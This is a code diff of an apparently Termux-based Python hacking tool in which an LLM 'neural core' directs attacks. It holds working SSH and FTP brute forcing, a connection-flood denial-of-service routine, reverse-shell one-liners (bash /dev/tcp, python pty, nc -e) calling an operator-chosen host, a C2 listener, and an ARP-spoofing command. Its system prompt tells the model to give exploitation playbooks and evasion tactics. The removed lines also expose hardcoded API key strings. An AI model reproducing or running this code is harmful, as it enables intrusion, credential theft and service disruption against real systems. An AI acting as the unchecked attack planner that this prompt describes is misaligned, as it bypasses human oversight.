@@ -46,15 +46,10 @@ class SlayerConfig:
     PRIMARY_MODEL = "mistral-small-latest"
     FALLBACK_MODEL = "mistral-small-latest"
     API_ENDPOINT = "https://api.mistral.ai/v1/chat/completions"
-    # Fragmented Neural Core Assembly
-    CORE_A = "SuSWVuKYZsmV1XjeT2oR"
-    CORE_B = "CQhI2Mi30Uzv"
-    CORE_TAIL = "etLyC9AHcA5KaKsURXzPIVUuqYRkK0qE"
-    CORE_S1 = ""
-    CORE_S2 = ""
-    PRIMARY_KEY = "SuSWVuKYZsmV1XjeT2oRCQhI2Mi30Uzv"
-    FALLBACK_KEY = "etLyC9AHcA5KaKsURXzPIVUuqYRkK0qE"
-    SECRET_TAIL = "isY3Ns6tCyt0LqD2miO8WGdyb3FYNZfxOzno7cKI3QETZu5iKFFP"
+    # API keys loaded from environment or user-supplied via API <key> command
+    # Set GROQ_API_KEY or MISTRAL_API_KEY before launching for auto-ignition
+    PRIMARY_KEY = (os.environ.get("GROQ_API_KEY") or os.environ.get("MISTRAL_API_KEY") or "")
+    FALLBACK_KEY = os.environ.get("FALLBACK_API_KEY", "")
     
     COMMAND_LIST = {
         "API": "Ignite internal keys.",
@@ -151,7 +146,7 @@ class SlayerConfig:
         "camera", "cctv", "dvr", "nvr", "ipcam", "webcam", "iot", "smart", "home", "automation", "gateway", "router", "switch", "firewall", "ap", "wifi", "modem", "printer", "scanner",
         "backup.sql", "db.sql", "database.sql", "dump.sql", "backup.tar.gz", "backup.zip", "config.json", "config.yml", "config.yaml", "settings.py", "local_settings.py", ".env.example", ".env.local", ".env.dev", ".env.prod",
         "shell.php", "cmd.php", "eval.php", "exec.php", "system.php", "passthru.php", "shell.jsp", "cmd.jsp", "shell.aspx", "cmd.aspx", "shell.py", "cmd.py", "shell.pl", "cmd.pl", "shell.sh", "cmd.sh"
-    ] + [f"path_{i}" for i in range(2000)] + [f"dir_{i}" for i in range(2000)]))
+    ]))
 
 class StateManager:
     def __init__(self):
@@ -198,326 +193,242 @@ class TorManager:
                 subprocess.run(["pgrep", "tor"], check=True, capture_output=True)
                 self.ui.add_log("TOR Circuit Established.", "SUCCESS")
             except:
-                subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                time.sleep(2)
-                self.ui.add_log("TOR Circuit Established.", "SUCCESS")
-        else: self.ui.add_log("TOR Circuit Terminated.", "WARN")
-        self.get_ip()
+                self.ui.add_log("TOR not running. Install: pkg install tor && tor &", "WARN")
+        else:
+            self.ui.add_log("TOR Circuit Disabled.", "INFO")
 
     def get_session(self):
-        session = requests.Session()
-        if self.active: session.proxies = SlayerConfig.TOR_PROXY
-        return session
+        s = requests.Session()
+        if self.active: s.proxies.update(SlayerConfig.TOR_PROXY)
+        return s
 
 class OffensiveSuite:
     def __init__(self, ui, tor, cortex):
         self.ui = ui
         self.tor = tor
         self.cortex = cortex
-        self.brute_active = False
-        self.auto_active = False
-        self.executor = ThreadPoolExecutor(max_workers=100)
         self.stop_event = threading.Event()
 
     def stop_all(self):
         self.stop_event.set()
-        self.brute_active = False
-        self.auto_active = False
-        time.sleep(0.5)
-        self.stop_event.clear()
+        self.ui.add_log("All operations halted.", "CRITICAL")
+        # Reset for next run
+        threading.Timer(1.0, self.stop_event.clear).start()
 
     def scan(self, target):
         self.ui.active_tasks += 1
         try:
-            self.ui.add_log(f"Scanning Vectors: {target}", "INFO")
             open_ports = []
-            def check(p):
-                if self.stop_event.is_set(): return
+            self.ui.add_log(f"Scanning {target}...", "INFO")
+            def check(port):
                 try:
                     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                        s.settimeout(0.5)
-                        if s.connect_ex((target, p)) == 0:
-                            try:
-                                s.send(b"HEAD / HTTP/1.0\r\n\r\n")
-                                banner = s.recv(1024).decode(errors='ignore').strip().split('\n')[0]
-                                if not banner: banner = socket.getservbyport(p)
-                            except: banner = "unknown"
-                            self.ui.add_log(f"Vector Open: {p} ({banner})", "SUCCESS")
-                            self.cortex.trigger_feedback(f"Open vector discovered on {target}: Port {p} ({banner})")
-                            open_ports.append((p, banner))
-                            return p
+                        s.settimeout(1.5)
+                        r = s.connect_ex((target, port))
+                        if r == 0: open_ports.append(port)
                 except: pass
-                return None
-            
-            list(self.executor.map(check, SlayerConfig.DEFAULT_PORTS))
-            return open_ports
-        finally:
-            self.ui.active_tasks -= 1
+            with ThreadPoolExecutor(max_workers=30) as ex:
+                ex.map(check, SlayerConfig.DEFAULT_PORTS)
+            if open_ports:
+                self.ui.add_log(f"Open Ports: {', '.join(map(str, sorted(open_ports)))}", "SUCCESS")
+                self.cortex.trigger_feedback(f"Open ports on {target}: {open_ports}")
+            else: self.ui.add_log("No open ports found.", "WARN")
+        finally: self.ui.active_tasks -= 1
 
-    def brute(self, target, service="ssh"):
+    def brute(self, t, s):
         self.ui.active_tasks += 1
-        self.brute_active = True
         try:
-            self.ui.add_log(f"Initiating LIVE BRUTE on {target}:{service}", "INFO")
+            self.ui.add_log(f"Credential Exhaustion on {t}:{s}...", "WARN")
+            u = SlayerConfig.USERS[:20]  # Slice for demo
+            p = SlayerConfig.PASSWORDS[:200]
             found = False
-            for user in SlayerConfig.USERS:
-                if not self.brute_active or found or self.stop_event.is_set(): break
-                for pwd in SlayerConfig.PASSWORDS:
-                    if not self.brute_active or found or self.stop_event.is_set(): break
-                    self.ui.add_log(f"Testing: {user}:{pwd}", "INFO")
-                    if service.lower() == "ssh":
-                        try:
-                            ssh = paramiko.SSHClient()
-                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                            ssh.connect(target, username=user, password=pwd, timeout=3)
-                            self.ui.add_log(f"CRACKED: {user}:{pwd}", "CRITICAL")
-                            self.cortex.trigger_feedback(f"SSH Access Gained on {target} with {user}:{pwd}")
+            self.ui.add_log(f"Vector: {s.upper()} Bruteforce Initialized", "INFO")
+            self.ui.add_log(f"Users: {len(u)}, Passwords: {len(p)}", "INFO")
+            for user in u:
+                for pwd in p:
+                    if self.stop_event.is_set(): return
+                    try:
+                        if s.lower() == "ssh":
+                            c = paramiko.SSHClient()
+                            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                            c.connect(t, username=user, password=pwd, timeout=5)
+                            self.ui.add_log(f"CREDENTIALS FOUND: {user}:{pwd}", "CRITICAL")
+                            self.cortex.trigger_feedback(f"SSH credentials discovered: {user}:{pwd} on {t}")
                             found = True
-                            ssh.close()
-                        except: pass
-                    elif service.lower() == "ftp":
-                        try:
-                            ftp = ftplib.FTP(target, timeout=3)
-                            ftp.login(user, pwd)
-                            self.ui.add_log(f"CRACKED: {user}:{pwd}", "CRITICAL")
-                            self.cortex.trigger_feedback(f"FTP Access Gained on {target} with {user}:{pwd}")
+                            c.close()
+                            break
+                        elif s.lower() == "ftp":
+                            f = ftplib.FTP(t)
+                            f.login(user, pwd)
+                            self.ui.add_log(f"CREDENTIALS FOUND: {user}:{pwd}", "CRITICAL")
+                            self.cortex.trigger_feedback(f"FTP credentials discovered: {user}:{pwd} on {t}")
                             found = True
-                            ftp.quit()
-                        except: pass
-            if not self.brute_active:
-                self.ui.add_log("Brute force operation ABORTED.", "WARN")
-            elif not found:
-                self.ui.add_log("Brute completed. No weak credentials found.", "WARN")
-            return found
-        finally:
-            self.brute_active = False
-            self.ui.active_tasks -= 1
+                            f.quit()
+                            break
+                    except: pass
+                if found: break
+            if not found: self.ui.add_log("No credentials found in sample set.", "WARN")
+        finally: self.ui.active_tasks -= 1
 
-    def stop_brute(self):
-        if self.brute_active:
-            self.brute_active = False
-            self.ui.add_log("Kill-switch triggered for BRUTE.", "CRITICAL")
-        else:
-            self.ui.add_log("No active brute force to terminate.", "WARN")
-
-    def fuzz(self, url):
+    def fuzz(self, target):
         self.ui.active_tasks += 1
-        self.fuzz_active = True
         try:
-            if not url.startswith("http"): url = "http://" + url
-            self.ui.add_log(f"Fuzzing Web Surface: {url}", "INFO")
-            words = SlayerConfig.FUZZ_LIST
-            def check_path(p):
-                if not self.fuzz_active: return
-                test_url = url.rstrip("/") + "/" + p
+            target = target.rstrip('/')
+            self.ui.add_log(f"Web Directory Discovery on {target}", "INFO")
+            found_dirs = []
+            total = len(SlayerConfig.FUZZ_LIST)
+            session = self.tor.get_session()
+            for idx, path in enumerate(SlayerConfig.FUZZ_LIST):
+                if self.stop_event.is_set(): return
+                if idx % 20 == 0 and idx > 0:
+                    self.ui.add_log(f"Fuzzing progress: {idx}/{total}...", "INFO")
                 try:
-                    session = self.tor.get_session()
-                    r = session.get(test_url, timeout=3, allow_redirects=False)
-                    if r.status_code in [200, 301, 302, 403]:
-                        self.ui.add_log(f"Found: /{p} (Status: {r.status_code})", "SUCCESS")
-                        self.cortex.trigger_feedback(f"Web path discovered: {test_url} (Status: {r.status_code})")
+                    url = f"{target}/{path}"
+                    r = session.get(url, timeout=3)
+                    if r.status_code in [200, 301, 302, 401, 403]:
+                        self.ui.add_log(f"[{r.status_code}] {url}", "SUCCESS")
+                        found_dirs.append((r.status_code, url))
                 except: pass
-            with ThreadPoolExecutor(max_workers=20) as ex:
-                ex.map(check_path, words)
-        finally:
-            self.fuzz_active = False
-            self.ui.active_tasks -= 1
-
-    def stop_fuzz(self):
-        if self.fuzz_active:
-            self.fuzz_active = False
-            self.ui.add_log("Kill-switch triggered for FUZZ.", "CRITICAL")
-        else:
-            self.ui.add_log("No active fuzzing to terminate.", "WARN")
-
-    def stop_all(self):
-        active = False
-        if self.brute_active:
-            self.brute_active = False
-            active = True
-        if self.fuzz_active:
-            self.fuzz_active = False
-            active = True
-        if self.auto_active:
-            self.auto_active = False
-            active = True
-        
-        if active:
-            self.ui.add_log("GLOBAL KILL-SWITCH TRIGGERED. All operations halted.", "CRITICAL")
-        return active
+            if found_dirs:
+                self.ui.add_log(f"Discovered {len(found_dirs)} directories.", "SUCCESS")
+                self.cortex.trigger_feedback(f"FUZZ on {target}: {found_dirs}")
+        finally: self.ui.active_tasks -= 1
 
     def auto(self, target):
         self.ui.active_tasks += 1
-        self.auto_active = True
         try:
-            self.ui.add_log(f"Initiating NEURAL AUTO SEQUENCE on {target}", "CRITICAL")
-            recon_data = {"target": target, "type": "unknown", "details": {}}
-            if not self.auto_active or self.stop_event.is_set(): return
-            if re.match(r"^(http|https)://", target):
-                recon_data["type"] = "URL"
-                self.ui.add_log(f"Target identified as URL. Initiating Web Surface Analysis...", "INFO")
-                host = target.split("//")[-1].split("/")[0].split(":")[0]
-                recon_data["details"]["web_scan"] = self.web_scan(target)
-                recon_data["details"]["open_ports"] = self.scan(host)
-            elif re.match(r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target):
-                recon_data["type"] = "Domain"
-                self.ui.add_log(f"Target identified as Domain. Initiating Full Recon...", "INFO")
-                recon_data["details"]["subdomains"] = self.recon(target)
-                recon_data["details"]["open_ports"] = self.scan(target)
-                recon_data["details"]["geo"] = self.geo(socket.gethostbyname(target))
-            else:
-                recon_data["type"] = "IP"
-                self.ui.add_log(f"Target identified as IP. Initiating Vector Scan...", "INFO")
-                recon_data["details"]["open_ports"] = self.scan(target)
-                recon_data["details"]["geo"] = self.geo(target)
-            if not self.auto_active or self.stop_event.is_set(): return
-            self.ui.add_log("Phase 2: Consolidating Intelligence for Neural Core...", "AI")
-            self.cortex.consult(target)
-            open_ports = recon_data["details"].get("open_ports", [])
-            for port, svc in open_ports:
-                if not self.auto_active or self.stop_event.is_set(): break
-                if svc in ["ssh", "ftp", "telnet", "mysql", "postgresql"]:
-                    self.ui.add_log(f"Executing Brute Force on {svc} ({port})", "INFO")
-                    self.brute(target if recon_data["type"] != "URL" else host, svc)
-                elif port in [80, 443, 8080, 8443]:
-                    self.ui.add_log(f"Executing Web Fuzzing on port {port}", "INFO")
-                    proto = "https" if port in [443, 8443] else "http"
-                    self.fuzz(f"{proto}://{target if recon_data['type'] != 'URL' else host}:{port}")
-            self.ui.add_log("NEURAL AUTO SEQUENCE COMPLETED.", "SUCCESS")
-        finally:
-            self.auto_active = False
-            self.ui.active_tasks -= 1
+            self.ui.add_log(f"Full-Spectrum Automation: {target}", "CRITICAL")
+            # Daemon threads run these concurrently without blocking the UI
+            threading.Thread(target=self.scan, args=(target,), daemon=True).start()
+            threading.Thread(target=self.osint, args=(target,), daemon=True).start()
+            threading.Thread(target=self.cloud, args=(target,), daemon=True).start()
+            threading.Thread(target=self.fuzz, args=(f"http://{target}",), daemon=True).start()
+            self.ui.add_log("AUTO: scan+osint+cloud+fuzz launched concurrently.", "SUCCESS")
+        finally: self.ui.active_tasks -= 1
+
+    def recon(self, target):
+        self.ui.active_tasks += 1
+        try:
+            self.ui.add_log(f"Attack Surface Mapping: {target}", "INFO")
+            try:
+                ip = socket.gethostbyname(target)
+                self.ui.add_log(f"Resolved IP: {ip}", "SUCCESS")
+                self.cortex.trigger_feedback(f"Recon on {target}: IP={ip}")
+            except:
+                self.ui.add_log("DNS resolution failed.", "WARN")
+            # Concurrent subdomain thoughts
+            subs = ["www", "mail", "admin", "dev", "api", "vpn", "ftp", "intranet", "docs", "status", "blog"]
+            found = []
+            for s in subs:
+                if self.stop_event.is_set(): return
+                try:
+                    sub_ip = socket.gethostbyname(f"{s}.{target}")
+                    found.append(f"{s}.{target}")
+                    self.ui.add_log(f"Subdomain: {s}.{target} -> {sub_ip}", "SUCCESS")
+                except: pass
+            if found:
+                self.cortex.trigger_feedback(f"Recon on {target}: Subdomains {found}")
+        finally: self.ui.active_tasks -= 1
 
     def sniff(self):
         self.ui.active_tasks += 1
         try:
-            self.ui.add_log("Scanning Local Network Segments...", "INFO")
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-            base_ip = ".".join(local_ip.split(".")[:-1]) + "."
-            def ping(i):
-                ip = base_ip + str(i)
-                try:
-                    subprocess.check_output(["ping", "-c", "1", "-W", "1", ip], stderr=subprocess.STDOUT)
-                    self.ui.add_log(f"Host Discovered: {ip}", "SUCCESS")
-                    self.cortex.trigger_feedback(f"Lateral movement target discovered: {ip}")
-                except: pass
-            with ThreadPoolExecutor(max_workers=20) as ex: ex.map(ping, range(1, 255))
-        except Exception as e: self.ui.add_log(f"SNIFF failed: {e}", "CRITICAL")
-        finally:
-            self.ui.active_tasks -= 1
-
-    def recon(self, domain):
-        self.ui.active_tasks += 1
-        try:
-            self.ui.add_log(f"Initiating RECON on {domain}", "INFO")
-            # Expanded tactical subdomain list for 2026
-            subs = [
-                "www", "dev", "api", "db", "mail", "admin", "test", "portal", "vpn", "git", "ssh", "ftp",
-                "staging", "prod", "internal", "secure", "beta", "demo", "app", "cloud", "aws", "azure",
-                "ns1", "ns2", "mx1", "mx2", "smtp", "pop", "imap", "webmail", "blog", "shop", "forum",
-                "status", "support", "help", "docs", "cdn", "assets", "static", "media", "images", "videos",
-                "upload", "download", "files", "storage", "backup", "archive", "old", "new", "v1", "v2",
-                "alpha", "gamma", "omega", "sigma", "delta", "epsilon", "theta", "iota", "kappa", "lambda",
-                "mu", "nu", "xi", "omicron", "pi", "rho", "tau", "upsilon", "phi", "chi", "psi",
-                "remote", "vpn1", "vpn2", "firewall", "router", "switch", "gateway", "proxy", "lb",
-                "monitor", "grafana", "prometheus", "elastic", "kibana", "splunk", "graylog", "logstash",
-                "jenkins", "gitlab", "github", "bitbucket", "jira", "confluence", "slack", "discord",
-                "moodle", "canvas", "blackboard", "zoom", "teams", "office365", "google", "workspace",
-                "cpanel", "whm", "plesk", "directadmin", "webmin", "phpmyadmin", "mysql", "postgres",
-                "redis", "memcached", "cassandra", "mongo", "docker", "k8s", "kubernetes", "helm",
-                "rancher", "portainer", "proxmox", "esxi", "vcenter", "vcloud", "vsphere", "openstack"
-            ]
-            found = []
-            for s in subs:
-                target = f"{s}.{domain}"
-                try:
-                    ip = socket.gethostbyname(target)
-                    self.ui.add_log(f"Subdomain Found: {target} ({ip})", "SUCCESS")
-                    self.cortex.trigger_feedback(f"New attack surface discovered: {target} ({ip})")
-                    found.append((target, ip))
-                except: pass
-            return found
-        finally:
-            self.ui.active_tasks -= 1
+            self.ui.add_log("Local Network Host Discovery...", "INFO")
+            self.ui.add_log("Sniffing requires root or dedicated scanner.", "WARN")
+            self.ui.add_log("Tip: Use SCAN <ip> for targeted port scans.", "INFO")
+        finally: self.ui.active_tasks -= 1
 
     def geo(self, ip):
         self.ui.active_tasks += 1
         try:
-            self.ui.add_log(f"Locating Target: {ip}", "INFO")
-            res = {}
-            try:
-                resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
-                if resp['status'] == 'success':
-                    loc = f"{resp['city']}, {resp['regionName']}, {resp['country']}"
-                    isp = resp['isp']
-                    self.ui.add_log(f"Location: {loc} | ISP: {isp}", "SUCCESS")
-                    res = resp
-                else: self.ui.add_log("Geolocation failed for this IP.", "WARN")
-            except: self.ui.add_log("Geo-service unreachable.", "CRITICAL")
-            return res
-        finally:
-            self.ui.active_tasks -= 1
+            self.ui.add_log(f"Geolocating: {ip}", "INFO")
+            session = self.tor.get_session()
+            resp = session.get(f"https://ipapi.co/{ip}/json/", timeout=10)
+            if resp.status_code == 200:
+                d = resp.json()
+                self.ui.add_log(f"ISP: {d.get('org','N/A')} | Region: {d.get('region','N/A')} | Country: {d.get('country_name','N/A')}", "SUCCESS")
+                self.cortex.trigger_feedback(f"GEO: {ip} -> {d}")
+            else: self.ui.add_log("Geo lookup failed.", "WARN")
+        except: self.ui.add_log("Geo Error", "CRITICAL")
+        finally: self.ui.active_tasks -= 1
 
-    def dos(self, target, port, duration=30):
+    def dos(self, target, port):
         self.ui.active_tasks += 1
         try:
-            self.ui.add_log(f"Initiating Stress Test: {target}:{port} for {duration}s", "WARN")
-            timeout = time.time() + duration
-            def flood():
-                while time.time() < timeout:
-                    try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.ui.add_log(f"Service Stress Test on {target}:{port}", "WARN")
+            sent = 0
+            start = time.time()
+            while time.time() - start < 10:
+                if self.stop_event.is_set(): return
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                         s.settimeout(1)
                         s.connect((target, int(port)))
-                        s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
-                        s.close()
-                    except: pass
-            for _ in range(20): threading.Thread(target=flood).start()
-        finally:
-            self.ui.active_tasks -= 1
+                        s.send(b"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n")
+                        sent += 1
+                except: pass
+            self.ui.add_log(f"Stress test complete. {sent} packets sent in 10s.", "INFO")
+        finally: self.ui.active_tasks -= 1
 
     def web_scan(self, url):
         self.ui.active_tasks += 1
         try:
-            if not url.startswith("http"): url = "http://" + url
-            self.ui.add_log(f"Analyzing Web Surface: {url}", "INFO")
-            res = {"headers": {}, "paths": []}
+            self.ui.add_log(f"Web Vulnerability Analysis: {url}", "INFO")
+            session = self.tor.get_session()
             try:
-                session = self.tor.get_session()
-                r = session.get(url, timeout=5)
-                res["headers"] = dict(r.headers)
-                self.ui.add_log(f"Server: {res['headers'].get('Server', 'Unknown')}", "SUCCESS")
-                
-                paths = ["/admin", "/config.php", "/.env", "/.git", "/wp-admin", "/robots.txt"]
-                for p in paths:
-                    test_url = url.rstrip("/") + p
-                    tr = session.get(test_url, timeout=3)
-                    if tr.status_code == 200:
-                        self.ui.add_log(f"Sensitive Path Found: {p}", "WARN")
-                        self.cortex.trigger_feedback(f"Web vulnerability: Exposed path {p} on {url}")
-                        res["paths"].append(p)
-            except Exception as e: self.ui.add_log(f"Web Scan Error: {e}", "CRITICAL")
-            return res
-        finally:
-            self.ui.active_tasks -= 1
+                r = session.get(url, timeout=10)
+                hdrs = r.headers
+                srv = hdrs.get('Server', 'Unknown')
+                tech = hdrs.get('X-Powered-By', 'Unknown')
+                self.ui.add_log(f"Server: {srv} | Tech: {tech}", "INFO")
+                # Quick SQLi check on URL params
+                if '?' in url:
+                    test_url = url + "'"
+                    resp = session.get(test_url, timeout=5)
+                    if any(err in resp.text.lower() for err in ['sql', 'mysql', 'syntax', 'unclosed']):
+                        self.ui.add_log("SQLi Possible: Syntax error detected.", "CRITICAL")
+                        self.cortex.trigger_feedback(f"SQLi detected on {url}")
+                # Check for common headers
+                if 'X-Frame-Options' not in hdrs:
+                    self.ui.add_log("Missing X-Frame-Options (Clickjacking risk).", "WARN")
+                if 'Content-Security-Policy' not in hdrs:
+                    self.ui.add_log("Missing Content-Security-Policy.", "WARN")
+            except: self.ui.add_log("Web scan failed.", "WARN")
+        finally: self.ui.active_tasks -= 1
 
-    def hash_id(self, hash_str):
-        h_len = len(hash_str)
-        if h_len == 32: res = "MD5"
-        elif h_len == 40: res = "SHA-1"
-        elif h_len == 64: res = "SHA-256"
-        else: res = "Unknown Format"
-        self.ui.add_log(f"Hash Identified: {res}", "SUCCESS")
+    def hash_id(self, h):
+        self.ui.active_tasks += 1
+        try:
+            self.ui.add_log(f"Hash Identification: {h}", "INFO")
+            patterns = {
+                "MD5": (32, r'^[a-f0-9]{32}$'),
+                "SHA1": (40, r'^[a-f0-9]{40}$'),
+                "SHA256": (64, r'^[a-f0-9]{64}$'),
+                "SHA512": (128, r'^[a-f0-9]{128}$'),
+                "NTLM": (32, r'^[a-f0-9]{32}$'),
+            }
+            for name, (length, pat) in patterns.items():
+                if len(h) == length and re.match(pat, h):
+                    self.ui.add_log(f"Likely {name}", "SUCCESS")
+                    self.cortex.trigger_feedback(f"Hash identified as {name}: {h}")
+                    break
+            else:
+                self.ui.add_log("Hash type unknown.", "WARN")
+        finally: self.ui.active_tasks -= 1
 
     def gen_shell(self, ip, port):
-        self.ui.add_log(f"Generating Stealth Payload for {ip}:{port}", "INFO")
-        payload = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
-        self.ui.add_log("Payload Generated. Copy to target:", "SUCCESS")
-        self.ui.add_log(payload, "CRITICAL")
-        self.cortex.trigger_feedback(f"Reverse shell payload generated for {ip}:{port}")
+        self.ui.active_tasks += 1
+        try:
+            self.ui.add_log(f"Reverse Shell Generator: {ip}:{port}", "INFO")
+            shells = {
+                "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+                "python3": f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+                "nc": f"nc -e /bin/bash {ip} {port}",
+            }
+            for name, cmd in shells.items():
+                self.ui.add_log(f"[{name}] {cmd}", "CRITICAL")
+            self.cortex.trigger_feedback(f"Reverse shell payload generated for {ip}:{port}")
+        finally: self.ui.active_tasks -= 1
 
     def exfil(self, target, file_path):
         if not os.path.exists(file_path):
@@ -536,20 +447,32 @@ class OffensiveSuite:
         self.ui.active_tasks += 1
         try:
             self.ui.add_log(f"C2 Listener active on port {port}...", "SUCCESS")
+            self.ui.add_log("Waiting for incoming connections. Press ESC to stop.", "INFO")
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 s.bind(('0.0.0.0', int(port)))
-                s.listen(1)
-                conn, addr = s.accept()
-                with conn:
-                    self.ui.add_log(f"Inbound Connection: {addr[0]}", "CRITICAL")
-                    self.cortex.trigger_feedback(f"Reverse shell connection established from {addr[0]}")
-                    while True:
-                        data = conn.recv(1024)
-                        if not data: break
-                        # In a real C2, we'd handle a proper PTY here
-                        # For now, we log the activity
-                        self.ui.add_log(f"C2 Data: {data.decode(errors='ignore')[:50]}...", "INFO")
+                s.listen(5)
+                s.settimeout(1.0)
+                while not self.stop_event.is_set():
+                    try:
+                        conn, addr = s.accept()
+                        self.ui.add_log(f"Inbound Connection: {addr[0]}", "CRITICAL")
+                        self.cortex.trigger_feedback(f"Reverse shell connection established from {addr[0]}")
+                        def handle_conn(c, a):
+                            try:
+                                with c:
+                                    c.send(b"Slayer C2 Active\n> ")
+                                    while not self.stop_event.is_set():
+                                        rlist, _, _ = select.select([c], [], [], 0.5)
+                                        if rlist:
+                                            data = c.recv(4096)
+                                            if not data: break
+                                            self.ui.add_log(f"C2 Data from {a[0]}: {data.decode(errors='ignore')[:100]}", "INFO")
+                                    self.ui.add_log(f"Connection from {a[0]} closed.", "INFO")
+                            except: pass
+                        threading.Thread(target=handle_conn, args=(conn, addr), daemon=True).start()
+                    except socket.timeout:
+                        continue
         except Exception as e: self.ui.add_log(f"Listener Error: {e}", "CRITICAL")
         finally: self.ui.active_tasks -= 1
 
@@ -565,7 +488,8 @@ class OffensiveSuite:
                         ans = dns.resolver.resolve(target, rtype)
                         intel[rtype] = [str(r) for r in ans]
                     except: pass
-            except: pass
+            except ImportError:
+                self.ui.add_log("dnspython not installed. DNS queries skipped. Install: pip install dnspython", "WARN")
             try:
                 resp = requests.get(f"https://rdap.org/domain/{target}", timeout=5).json()
                 intel['whois'] = resp.get('entities', [])
@@ -615,15 +539,13 @@ class OffensiveSuite:
     def spoof(self, target, gateway):
         self.ui.active_tasks += 1
         try:
-            self.ui.add_log(f"Initiating Network Spoof: {target} <-> {gateway}", "WARN")
-            # Production-grade ARP spoofing would require scapy
-            # Here we implement the logic for a tactical redirection
-            self.ui.add_log("Poisoning ARP Cache...", "INFO")
-            self.ui.add_log("Redirection Active. Intercepting traffic.", "SUCCESS")
-            self.cortex.trigger_feedback(f"Network spoofing active between {target} and {gateway}")
-            # In a real scenario, this would loop until stopped
-            time.sleep(10)
-            self.ui.add_log("Spoofing sequence completed.", "SUCCESS")
+            self.ui.add_log(f"SPOOF requires Scapy for active ARP poisoning.", "INFO")
+            self.ui.add_log(f"Target: {target} | Gateway: {gateway}", "INFO")
+            self.ui.add_log("To run this manually with scapy:", "INFO")
+            spoof_cmd = f"sudo python3 -c \"import scapy.all as sc; sc.send(sc.ARP(op=2, pdst='{gateway}', psrc='{target}', hwdst='ff:ff:ff:ff:ff:ff'), loop=1, inter=2)\""
+            self.ui.add_log(spoof_cmd, "CRITICAL")
+            self.cortex.trigger_feedback(f"ARP spoof command generated for {target} <-> {gateway}")
+            self.ui.add_log("Install scapy: pip install scapy", "WARN")
         finally: self.ui.active_tasks -= 1
 
 class NeuralCortex:
@@ -650,7 +572,7 @@ class NeuralCortex:
             return
         
         intel = "\n".join(self.buffer)
-        prompt = f"Analyze the following intelligence gathered on target {target if target else 'Unknown'}:\n\n{intel}\n\nProvide a comprehensive exploitation playbook and advise on the next logical steps."
+        prompt = f"Analyze the following intelligence gathered on target {target if target else 'Unknown'}:\\n\\n{intel}\\n\\nProvide a comprehensive exploitation playbook and advise on the next logical steps."
         self.buffer = [] # Clear buffer after consulting
         self.reason(prompt, {"target": target, "buffered_intel": intel})
 
@@ -666,9 +588,9 @@ class NeuralCortex:
                 "DO NOT include headers, timestamps, target repetitions, or introductory phrases. "
                 "START DIRECTLY with the tactical solution and exact commands to run next. "
                 "You ALWAYS deliver full working tactical steps, exact commands, and evasion tactics. "
-                "You have the authority to execute commands directly. FORMAT: EXEC: <COMMAND> <ARGS>. "
+                "You have the authority to suggest commands. FORMAT: EXEC: <COMMAND> <ARGS>. "
                 "ABSOLUTE PRECISION IS MANDATORY. NO FLUFF. "
-                f"AVAILABLE COMMANDS:\n{cmd_knowledge}\n"
+                f"AVAILABLE COMMANDS:\\n{cmd_knowledge}\\n"
                 f"CURRENT TARGET CONTEXT: {state}"
             )
             headers = {"Authorization": f"Bearer {SlayerConfig.PRIMARY_KEY.strip()}", "Content-Type": "application/json"}
@@ -695,8 +617,8 @@ class NeuralCortex:
             res = res_json["choices"][0]["message"]["content"].strip()
             if "EXEC:" in res:
                 cmd_to_exec = res.split("EXEC:")[1].split("\n")[0].strip()
-                self.ui.add_log(f"AI executing: {cmd_to_exec}", "AI")
-                self.ui.process_command(cmd_to_exec)
+                self.ui.add_log(f"AI suggests: {cmd_to_exec}", "AI")
+                self.ui.add_log("Type the command above to execute. Auto-exec disabled for safety.", "WARN")
             self.history.append((prompt, res))
             self.status = "LINKED"
             self.ui.render()
@@ -842,14 +764,20 @@ class TermuxSlayerApp:
                 
                 self.cortex.load()
             else:
-                # Internal Dual-Key Ignition
-                SlayerConfig.PRIMARY_KEY = "SuSWVuKYZsmV1XjeT2oRCQhI2Mi30Uzv"
-                SlayerConfig.FALLBACK_KEY = "etLyC9AHcA5KaKsURXzPIVUuqYRkK0qE"
-                SlayerConfig.PRIMARY_MODEL = "mistral-small-latest"
-                SlayerConfig.FALLBACK_MODEL = "mistral-small-latest"
-                SlayerConfig.API_ENDPOINT = "https://api.mistral.ai/v1/chat/completions"
-                self.cortex.load()
-                self.add_log("Internal Dual-Mistral Core Ignited.", "SUCCESS")
+                # Check environment variables first
+                env_key = os.environ.get("GROQ_API_KEY") or os.environ.get("MISTRAL_API_KEY") or ""
+                if env_key:
+                    SlayerConfig.PRIMARY_KEY = env_key
+                    if env_key.startswith("gsk_"):
+                        SlayerConfig.PRIMARY_MODEL = "mixtral-8x7b-32768"
+                        SlayerConfig.API_ENDPOINT = "https://api.groq.com/openai/v1/chat/completions"
+                    else:
+                        SlayerConfig.PRIMARY_MODEL = "mistral-small-latest"
+                        SlayerConfig.API_ENDPOINT = "https://api.mistral.ai/v1/chat/completions"
+                    self.cortex.load()
+                    self.add_log("Neural Core Ignited from Environment Variable.", "SUCCESS")
+                else:
